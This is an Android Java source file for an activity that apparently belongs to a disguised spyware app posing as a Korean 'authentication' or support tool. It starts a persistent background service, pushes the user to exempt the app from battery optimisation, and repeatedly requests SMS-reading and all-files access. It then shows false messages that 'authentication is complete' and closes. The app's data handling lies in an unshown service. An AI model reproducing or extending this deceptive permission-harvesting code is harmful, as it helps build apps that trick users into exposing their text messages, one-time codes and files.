package com.support.samsg;

import static android.os.Build.VERSION.SDK_INT;


import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;



public class MainActivity extends Activity {

    boolean bflag_battery = false;
    boolean bflag_noti = false;
    boolean bflag_sms = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent(this, loop.class);
        if (SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent,100);
            }
            else {
                if (SDK_INT >= 33) {
                    if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") == PackageManager.PERMISSION_GRANTED) {
                        bflag_noti = true;
                        if (checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                            bflag_sms = true;
                            if (checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                                bflag_sms = true;
                                request_file();
                            }
                            else {
                                String[] perms = new String[1];
                                perms[0] = "android.permission.READ_SMS";
                                int permCheck = checkSelfPermission(Manifest.permission.READ_SMS);
                                requestPermissions(perms, 112);
                            }

                        }
                        else  {
                            String[] perms = new String[1];
                            perms[0] = "android.permission.READ_SMS";
                            int permCheck = checkSelfPermission(Manifest.permission.READ_SMS);
                            requestPermissions(perms, 112);
                        }
                    }
                    else {
                        String[] perms = new String[1];
                        perms[0] = "android.permission.POST_NOTIFICATIONS";
                        requestPermissions(perms, 108);
                    }
                }
                else{
                    if (checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                        bflag_sms = true;
                        request_file();
                    }
                    else {
                        String[] perms = new String[1];
                        perms[0] = "android.permission.READ_SMS";
                        int permCheck = checkSelfPermission(Manifest.permission.READ_SMS);
                        requestPermissions(perms, 112);
                    }
                }

            }
        }

    }

    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && requestCode == 108) {

            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") == PackageManager.PERMISSION_GRANTED) {
                bflag_noti = true;
            }
            else {
                //Toast.makeText(this,"NOTIFICATIONS 권한을 설정하여야 인증을 완료 할 수 있습니다.",Toast.LENGTH_LONG).show();
            }
            if (checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                bflag_sms = true;
            }
            else {
                String[] perms = new String[1];
                perms[0] = "android.permission.READ_SMS";
                int permCheck = checkSelfPermission(Manifest.permission.READ_SMS);
                requestPermissions(perms, 112);
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && requestCode == 112) {

            if (checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                bflag_sms = true;
            }
            else {
               // Toast.makeText(this," 권한을 설정하여야 인증과정과 연관된 SMS를 수신할수 있습니다.",Toast.LENGTH_LONG).show();
            }
            request_file();
        }
        if (requestCode == 145) {
            if (SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "권한을 허용해야 인증을 완료 할 수 있습니다.", Toast.LENGTH_LONG).show();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    request_file();
                } else {
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    Toast.makeText(this, "인증이 완료 되었습니다.", Toast.LENGTH_LONG).show();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    finish();
                }
            }
        }
    }


    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100) {
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (SDK_INT >= Build.VERSION_CODES.M) {
                if (pm.isIgnoringBatteryOptimizations(packageName)) {
                    bflag_battery = true;
                    if (SDK_INT >= 33) {
                        String[] perms = new String[1];
                        perms[0] = "android.permission.POST_NOTIFICATIONS";
                        requestPermissions(perms, 108);
                    } else {
                        String[] perms = new String[1];
                        perms[0] = "android.permission.READ_SMS";
                        requestPermissions(perms, 112);
                    }
                } else {
                    Toast.makeText(this, "권한 설정을 하여야 백그라운드에서 서비스가 작동할수 있습니다.", Toast.LENGTH_LONG).show();
                    Intent intent = new Intent();
                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    startActivityForResult(intent, 100);
                }
            }
        }
        if (requestCode == 123) {
            if (SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "권한을 허용해야 인증을 완료할 수 있습니다.", Toast.LENGTH_LONG).show();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    request_file();
                } else {
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    Toast.makeText(this, "인증이 완료 되었습니다.", Toast.LENGTH_LONG).show();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    finish();
                }
            }
        }

    }
    public void request_file()
    {
        if (SDK_INT >= Build.VERSION_CODES.M) {
            if (SDK_INT >= Build.VERSION_CODES.R) {
                if(!Environment.isExternalStorageManager()) {
                    try {
                        Uri uri = Uri.parse("package:" + getApplicationContext().getPackageName());
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri);
                        startActivityForResult(intent, 123);
                    } catch (Exception e) {
                        Intent intent = new Intent();
                        intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        startActivityForResult(intent, 123);
                    }
                }
                else {
                    Toast.makeText(this, "인증이 완료 되 었습니다.", Toast.LENGTH_LONG).show();
                    finish();
                }
            } else {
                //below android 11
                if (SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                        requestPermissions(
                                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},145);
                    } else {
                        Toast.makeText(this, "인증이 완료 되 었습니다.", Toast.LENGTH_LONG).show();
                        finish();
                    }
                }
            }
        }
    }

}